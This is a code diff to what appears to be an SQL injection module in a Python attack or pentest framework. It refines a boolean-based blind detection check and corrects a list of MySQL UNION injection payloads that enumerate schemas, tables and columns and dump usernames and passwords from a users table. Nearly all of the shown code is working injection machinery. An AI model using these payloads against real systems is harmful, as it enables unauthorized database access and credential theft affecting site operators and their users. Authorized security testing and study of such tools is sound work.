@@ -227,8 +227,12 @@ class SQLiModule:
                 true_len = len(true_response.text)
                 false_len = len(false_response.text)
                 
-                # If responses differ significantly, likely boolean-based SQLi
-                if abs(true_len - false_len) > abs(baseline_len - true_len) * 0.5:
+                # If TRUE and FALSE responses differ significantly from each other,
+                # and TRUE response is closer to baseline, likely boolean-based SQLi
+                diff_true_false = abs(true_len - false_len)
+                diff_baseline_true = abs(baseline_len - true_len)
+                
+                if diff_true_false > 50 and diff_baseline_true < diff_true_false:
                     from core.engine import Finding
                     finding = Finding(
                         technique="SQL Injection (Boolean-based Blind)",
@@ -251,7 +255,7 @@ class SQLiModule:
         
         if db_type == 'mysql':
             queries = [
-                "' UNION SELECT null,schema_name,null FROM information_schema.schemhemas --",
+                "' UNION SELECT null,schema_name,null FROM information_schema.schemata --",
                 "' UNION SELECT null,table_name,null FROM information_schema.tables WHERE table_schema=database() --",
                 "' UNION SELECT null,column_name,null FROM information_schema.columns WHERE table_name='users' --",
                 "' UNION SELECT null,concat(username,':',password),null FROM users --",
